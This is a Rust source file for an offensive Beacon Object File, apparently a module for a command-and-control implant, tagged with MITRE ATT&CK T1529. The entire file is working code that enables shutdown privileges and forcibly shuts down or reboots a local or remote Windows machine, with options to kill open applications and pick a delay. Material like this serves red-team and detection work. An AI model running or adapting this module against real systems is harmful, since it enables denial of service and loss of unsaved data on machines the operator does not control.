//! # Shutdown BOF
//!
//! Shuts down or reboots a local or remote computer using
//! `InitiateSystemShutdownExA`. Enables the appropriate shutdown privilege
//! (`SeShutdownPrivilege` for local, `SeRemoteShutdownPrivilege` for remote)
//! before initiating the shutdown.
//! ## MITRE ATT&CK
//! - T1529 - System Shutdown/Reboot
//!
//! ## Arguments
//! - `str`: Target hostname (empty string for local machine).
//! - `int`: Timeout in seconds before shutdown.
//! - `int`: Force close applications (0 = no, 1 = yes).
//! - `int`: Reboot after shutdown (0 = no, 1 = yes).

#![no_std]

use alloc::string::String;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError, LUID};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_PRIVILEGES,
};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

const SHTDN_REASON_MAJOR_OTHER: u32 = 0x00000000;

unsafe extern "system" {
    fn InitiateSystemShutdownExA(
        lp_machine_name: *const u8,
        lp_message: *const u8,
        dw_timeout: u32,
        b_force_apps_closed: i32,
        b_reboot_after_shutdown: i32,
        dw_reason: u32,
    ) -> i32;
}

fn enable_privilege(privilege: &[u8]) -> u32 {
    unsafe {
        let mut token: *mut core::ffi::c_void = core::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == FALSE {
            return GetLastError();
        }

        let mut luid: LUID = core::mem::zeroed();
        if LookupPrivilegeValueA(core::ptr::null(), privilege.as_ptr(), &mut luid) == FALSE {
            let err = GetLastError();
            CloseHandle(token);
            return err;
        }

        let mut tp: TOKEN_PRIVILEGES = core::mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(
            token,
            FALSE,
            &tp,
            core::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        ) == FALSE
        {
            let err = GetLastError();
            CloseHandle(token);
            return err;
        }

        let err = GetLastError();
        CloseHandle(token);
        err
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);

    let hostname = String::from(parser.get_str());
    let timeout = parser.get_int() as u32;
    let force = parser.get_int();
    let reboot = parser.get_int();

    println!("shutdown:");
    println!("  hostname: {}", hostname);
    println!("  timeout:  {} seconds", timeout);
    println!("  force:    {}", force);
    println!("  reboot:   {}", reboot);

    let is_remote = !hostname.is_empty();
    let privilege: &[u8] = if is_remote {
        b"SeRemoteShutdownPrivilege\0"
    } else {
        b"SeShutdownPrivilege\0"
    };

    let priv_result = enable_privilege(privilege);
    if priv_result != 0 {
        eprintln!("Failed to enable shutdown privilege ({:#X})", priv_result);
        return;
    }
    println!("Shutdown privilege enabled.");

    let hostname_cstr = rustbof::str::to_cstr(&hostname);
    let host_ptr = if hostname.is_empty() {
        core::ptr::null()
    } else {
        hostname_cstr.as_ptr() as *const u8
    };

    let message = b"System shutdown initiated by BOF.\0";

    let result = unsafe {
        InitiateSystemShutdownExA(
            host_ptr,
            message.as_ptr(),
            timeout,
            force,
            reboot,
            SHTDN_REASON_MAJOR_OTHER,
        )
    };

    if result == 0 {
        let err = unsafe { GetLastError() };
        eprintln!("InitiateSystemShutdownExA failed ({:#X})", err);
    } else {
        println!("SUCCESS.");
    }
}
